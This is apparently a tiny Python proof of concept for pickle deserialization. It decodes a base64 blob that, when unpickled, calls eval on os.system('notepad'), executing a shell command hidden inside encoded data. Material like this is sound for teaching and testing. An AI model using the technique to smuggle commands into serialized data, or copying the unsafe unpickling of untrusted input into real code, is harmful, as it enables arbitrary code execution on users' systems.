# *_*coding:utf-8 *_*

import pickle,base64,os

ret=b'gANjYnVpbHRpbnMKZXZhbApxAFgUAAAAb3Muc3lzdGVtKCdub3RlcGFkJylxAYVxAlJxAy4='
ret_decode=base64.b64decode(ret)
pickle.loads(ret_decode)